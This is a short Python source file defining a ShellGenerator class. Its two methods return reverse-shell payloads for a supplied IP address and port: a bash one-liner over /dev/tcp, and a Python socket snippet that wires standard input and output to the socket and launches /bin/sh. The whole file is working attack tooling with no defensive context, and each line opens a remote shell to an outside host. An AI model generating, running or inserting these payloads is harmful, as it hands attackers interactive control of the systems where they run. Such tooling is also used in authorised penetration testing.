class ShellGenerator:
    def simple_bash(self, ip, port):
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    def python_reverse(self, ip, port):
        return ("import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{ip}\",{port}));"
                "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                "subprocess.call(\"/bin/sh\")")
